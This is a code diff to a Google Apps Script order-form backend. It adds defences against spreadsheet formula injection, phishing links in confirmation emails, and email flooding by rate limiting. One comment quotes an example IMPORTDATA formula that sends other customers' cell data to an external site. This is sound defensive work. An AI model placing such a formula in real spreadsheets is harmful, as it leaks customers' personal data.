@@ -59,6 +59,14 @@ function esc(v) {
     .replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")
     .replace(/"/g, "&quot;").replace(/'/g, "&#39;");
 }
+// 寫進給人看的工作表時，以 = + - @ 開頭的文字會被 Google Sheets 當成公式執行，
+// 例如 =IMPORTDATA("https://外部網站/?"&C2) 會在開啟試算表時把其他客人的資料送出去。
+// 前面加 ' 讓它變成純文字（儲存格仍顯示原本內容）。app_data 存的是 JSON，不受影響。
+function safeCell(v) {
+  return (typeof v === "string" && /^[=+\-@\t\r]/.test(v)) ? "'" + v : v;
+}
+function safeRow(row) { return row.map(safeCell); }
+
 // 與前端相同格式：2026/11/12 下午3:04:05
 function nowTw() {
   var d = new Date();
@@ -211,6 +219,52 @@ function handlePost(p) {
 // ─── 下單（公開）───────────────────────────────────────────────────────────
 var RECIPIENT_FIELDS = ["recipientName", "recipientAddress", "recipientPhone"];
 
+// 網址樣式：http(s)、://、www.、或「字.常見網域」（例如 bit.ly、evil.com）
+var URL_LIKE = /(https?:|:\/\/|www\.|[a-z0-9-]+\.(com|net|org|io|ly|me|cc|co|xyz|top|info|link|site|app|tw|gl|to|gd)\b)/i;
+// 電話：只允許數字、空白、+ - ( ) #，6～30 字
+var PHONE_OK = /^[0-9+\-()#\s]{6,30}$/;
+
+// ─── 頻率限制 ─────────────────────────────────────────────────────────────
+// 防止有人大量下單，用你的 Gmail 對任意信箱寄信（垃圾信／釣魚），或耗盡每日寄信額度
+// 讓真正客人的確認信寄不出去。數字遠高於正常用量（平常一個月約 20 筆）。
+var RL_PER_HOUR = 20;        // 全站每小時最多幾次會寄信的送出
+var RL_PER_DAY = 50;         // 全站每天最多幾次（一般 Gmail 透過 Apps Script 每天約可寄 100 封）
+var RL_PER_EMAIL_HOUR = 5;   // 同一個 Email 每小時最多幾次（防止反覆修改來轟炸某人信箱）
+
+function rlKeys(email) {
+  var now = new Date();
+  var hour = Utilities.formatDate(now, "Asia/Taipei", "yyyyMMddHH");
+  return {
+    hour: "rl_h_" + hour,
+    email: "rl_e_" + hour + "_" + email,
+    day: "rl_d_" + Utilities.formatDate(now, "Asia/Taipei", "yyyyMMdd")
+  };
+}
+
+// 只在 submitOrder 的鎖內呼叫，計數不會有競爭
+function rateLimitAllow(email) {
+  var k = rlKeys(email);
+  var cache = CacheService.getScriptCache();
+  var props = PropertiesService.getScriptProperties();
+  return Number(cache.get(k.hour) || 0) < RL_PER_HOUR &&
+    Number(cache.get(k.email) || 0) < RL_PER_EMAIL_HOUR &&
+    Number(props.getProperty(k.day) || 0) < RL_PER_DAY;
+}
+
+function rateLimitRecord(email) {
+  var k = rlKeys(email);
+  var cache = CacheService.getScriptCache();
+  var props = PropertiesService.getScriptProperties();
+  cache.put(k.hour, String(Number(cache.get(k.hour) || 0) + 1), 3700);
+  cache.put(k.email, String(Number(cache.get(k.email) || 0) + 1), 3700);
+  props.setProperty(k.day, String(Number(props.getProperty(k.day) || 0) + 1));
+  // 清掉前幾天的每日計數，避免指令碼屬性越堆越多
+  var all = props.getProperties();
+  Object.keys(all).forEach(function (name) {
+    if (name.indexOf("rl_d_") === 0 && name !== k.day) props.deleteProperty(name);
+  });
+}
+
 function submitOrder(p) {
   if (!tokenOk(p.token)) return fail("unauthorized");
   var mode = p.mode === "update" ? "update" : "create";
@@ -234,6 +288,19 @@ function submitOrder(p) {
     if (!f[RECIPIENT_FIELDS[i]]) return fail("missing_fields");
   }
   if (mode === "create" && (!f.ordererName || !f.phone || !f.relation)) return fail("missing_fields");
+
+  // 這些欄位會出現在寄給客人的確認信裡。禁止網址，避免被拿來以你的名義寄釣魚信
+  // （Gmail 會把網址自動變成可點的連結）。修改訂單時只用得到收件欄位。
+  var textFields = mode === "create"
+    ? ["ordererName", "relation", "recipientName", "recipientAddress"]
+    : ["recipientName", "recipientAddress"];
+  for (var t = 0; t < textFields.length; t++) {
+    if (URL_LIKE.test(f[textFields[t]])) return fail("invalid_text");
+  }
+  var phoneFields = mode === "create" ? ["phone", "recipientPhone"] : ["recipientPhone"];
+  for (var q = 0; q < phoneFields.length; q++) {
+    if (!PHONE_OK.test(f[phoneFields[q]])) return fail("invalid_phone");
+  }
 
   var cats = catsForPricing();
   if (!cats) return fail("catalog_unavailable");
@@ -276,6 +343,12 @@ function submitOrder(p) {
         cart: priced.cart, total: priced.total, updatedAt: now, sid: sid
       });
     }
+    // 會寄信的送出（新訂單、或內容有變的修改）才計入頻率限制
+    if (changed && !rateLimitAllow(email)) {
+      Logger.log("submitOrder rate limited: " + email);
+      return fail("rate_limited");
+    }
+
     orders[email] = order;
     orders._v = Date.now();
     writeJson(key, orders);
@@ -300,6 +373,7 @@ function submitOrder(p) {
 
     syncOrders(key, JSON.stringify(orders));
     syncCustomers(JSON.stringify(custs));
+    if (changed) rateLimitRecord(email);
     return { success: true, order: order, settings: s, changed: changed };
   });
 
@@ -507,7 +581,11 @@ function syncCloseout(p) {
   // 只能寫入「結單表_YYYY_MM」，不能指定 app_data 等其他工作表
   if (!/^結單表_\d{4}_\d{2}$/.test(sheetName)) return fail("invalid_sheet");
   if (!p.value) return fail("missing_value");
-  var rows = JSON.parse(p.value);
+  var parsed = JSON.parse(p.value);
+  if (!Array.isArray(parsed) || parsed.some(function (r) { return !Array.isArray(r) || r.length !== 9; })) {
+    return fail("invalid_value");
+  }
+  var rows = parsed.map(safeRow);
   return withLock(function () {
     var sheet = getOrCreate(sheetName);
     sheet.clearContents();
@@ -631,10 +709,10 @@ function orderRows(key, jsonValue) {
         .filter(function (x) { return x[1] > 0; })
         .map(function (x) { return x[0] + "×" + x[1]; })
         .join("、");
-      return [label, o.ordererName, o.email, o.phone, o.relation,
+      return safeRow([label, o.ordererName, o.email, o.phone, o.relation,
         o.recipientName, o.recipientPhone, o.recipientAddress,
         cartText, o.total, o.status === "handled" ? "已處理" : "待處理",
-        o.createdAt, o.updatedAt || ""];
+        o.createdAt, o.updatedAt || ""]);
     });
 }
 
@@ -695,8 +773,8 @@ function syncCustomers(jsonValue) {
       .filter(function (k) { return k.charAt(0) !== "_"; })
       .map(function (k) {
         var c = customers[k];
-        return [c.email, c.name, c.phone, c.relation, c.lastRecipientName, c.lastRecipientPhone,
-          c.lastRecipientAddress, c.lastOrder, c.orderCount, c.firstOrderAt || ""];
+        return safeRow([c.email, c.name, c.phone, c.relation, c.lastRecipientName, c.lastRecipientPhone,
+          c.lastRecipientAddress, c.lastOrder, c.orderCount, c.firstOrderAt || ""]);
       });
     if (rows.length > 0) {
       sheet.getRange(2, 3, rows.length, 1).setNumberFormat("@");
